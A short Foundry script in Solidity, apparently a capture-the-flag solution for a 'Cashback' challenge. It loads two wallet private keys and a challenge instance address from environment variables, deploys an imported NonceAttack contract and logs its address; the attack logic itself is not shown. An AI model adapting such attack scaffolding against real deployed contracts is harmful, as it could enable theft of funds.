// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/NonceAttack.sol";

interface ICashback {
    // function token() external view returns (address);
    function superCashbackNFT() external view returns (address);
}

contract Solve is Script {
    function run() external {
        // 1. 讀取環境變數
        uint256 playerPk = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(playerPk);
        
        uint256 helperPk = vm.envUint("BURNER_WALLET_PRIVATE_KEY"); // 請準備第二個錢包
        address helper = vm.addr(helperPk);
        
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(playerPk);

        // 2. 部署攻擊合約
        NonceAttack attackContract = new NonceAttack();
        
        // 3. 獲取必要的合約地址資訊
        address freeToken = 0x13AaF3218Facf57CfBf5925E15433307b59BCC37;
        address nft = 0x4a5505B20Fc452527b456a7Ed5a3fD3f78620E34;
        
        console.log("Attack contract address:", address(attackContract));
        vm.stopBroadcast();

    }
}
